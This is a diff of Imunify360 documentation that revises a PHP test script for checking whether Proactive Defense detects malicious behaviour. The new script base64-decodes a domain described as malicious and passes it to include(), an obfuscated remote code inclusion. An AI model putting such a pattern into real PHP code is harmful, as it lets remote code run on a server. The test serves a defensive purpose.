@@ -694,19 +694,26 @@ The _Ignore List_ table includes the following columns:
 
 ``` PHP
 <?php
-$i=0;
-$a=base64_decode("t".$i);
-$b=str_replace("a","b", $a);
-print "Step 1<br>\n";
-$i++;
-$data = @curl_exec($handle);
-print "Step 2<br>\n";
+/* Imunify360 Proactive Defence test script */
+
+echo "<pre>";
+echo "Step 1<br>";
+
+// Decode string with domain: 37kddsserrt.xyz
+$url=base64_decode("MzdrZGRzc2VycnQueHl6");
+
+echo "Step 2<br>";
+echo "</pre>";
+
+// Try to access a malicious domain
+include($url);
+die();
 ?>
 ```
 3. Place this file on the server.
 4. Call a test page with the script from the point 2.
-5. If Proactive Defense is disabled, you will see Wget version in a web-browser.
-6. If Proactive Defense is enabled and _Log only_ mode is set, you will see the string _Rule for the testing of malicious_ in the _Detected Events_ table.
+5. If Proactive Defense is disabled, you will see _Step 1_ and _Step 2_ strings after calling the script.
+6. If Proactive Defense is enabled and _Log only_ mode is set, you will see _Step 1_ and _Step 2_ strings after calling the script and a new event in the _Detected Events_ table.
 7. If Proactive Defense is enabled and _Kill mode_ is set, the test page returns an error.
 
 ## Reputation Management
